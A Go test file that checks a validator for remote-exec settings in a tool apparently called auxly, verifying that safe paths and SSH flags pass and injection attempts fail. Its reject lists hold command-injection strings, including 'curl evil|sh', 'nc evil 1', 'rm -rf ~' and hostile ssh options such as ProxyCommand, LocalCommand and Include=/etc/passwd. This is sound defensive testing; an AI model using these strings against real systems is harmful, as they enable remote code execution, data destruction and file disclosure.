package cmd

import "testing"

// H1: HostBin is interpolated into the remote command; it must reject flag
// smuggling and shell metacharacters while still accepting legitimate paths
// (including Windows paths with backslashes/colons and a bare "auxly").
func TestValidateForExec_HostBin(t *testing.T) {
	// Windows install path uses no spaces (…\Programs\auxly\auxly.exe); a space in
	// host_bin would shell-split the remote command and is correctly rejected below.
	ok := []string{"auxly", "/usr/local/bin/auxly", `C:\Users\lab\AppData\Local\Programs\auxly\auxly.exe`, "auxly.exe"}
	for _, hb := range ok {
		if err := validateForExec(remoteProfile{HostBin: hb}); err != nil {
			t.Errorf("host_bin %q should be allowed, got: %v", hb, err)
		}
	}
	bad := []string{
		"-rf",
		"auxly; rm -rf ~",
		"auxly && curl evil|sh",
		"$(touch /tmp/pwned)",
		"auxly`whoami`",
		"auxly | nc evil 1",
	}
	for _, hb := range bad {
		if err := validateForExec(remoteProfile{HostBin: hb}); err == nil {
			t.Errorf("host_bin %q should be rejected", hb)
		}
	}
}

// M3: user-supplied ssh_args must block external-config loaders and command/
// control-socket options, while still allowing common safe auth/transport flags.
func TestValidateForExec_SSHArgs(t *testing.T) {
	okArgs := [][]string{
		{"-i", "/home/u/.ssh/id_ed25519"},
		{"-p", "2222"},
		{"-o", "IdentitiesOnly=yes"},
		{"-o", "StrictHostKeyChecking=accept-new"},
		{"-o", "ConnectTimeout=10"},
		{"-C"},
		// Legitimate identity paths whose directory is literally named "include"
		// must NOT be mistaken for the SSH Include directive (regression guard).
		{"-i", "/home/wael/include/id_ed25519"},
		{"-o", "IdentityFile=/srv/include/key"},
	}
	for _, args := range okArgs {
		if err := validateForExec(remoteProfile{SSHArgs: args}); err != nil {
			t.Errorf("ssh_args %v should be allowed, got: %v", args, err)
		}
	}
	badArgs := [][]string{
		{"-o", "ProxyCommand=nc evil 1"},
		{"-o", "LocalCommand=touch /tmp/x"},
		{"-o", "PermitLocalCommand=yes"},
		{"-F", "/tmp/evil_ssh_config"},
		{"-F/tmp/evil"},
		{"-o", "Include=/tmp/evil"},
		{"-oInclude=/etc/passwd"},     // single-element -oInclude form
		{"-o", "Include /etc/passwd"}, // single-element space form (stripped → "include/etc/passwd")
		{"-o\tInclude=/tmp/evil"},     // TAB separator must not bypass (whitespace-aware strip)
		{"-o", "\tInclude=/tmp/evil"}, // leading-tab element form
		{"-o", "ControlPath=/tmp/hijack"},
		{"-o", "ControlMaster=yes"},
		{"-S", "/tmp/ctl"},
	}
	for _, args := range badArgs {
		if err := validateForExec(remoteProfile{SSHArgs: args}); err == nil {
			t.Errorf("ssh_args %v should be rejected", args)
		}
	}
}
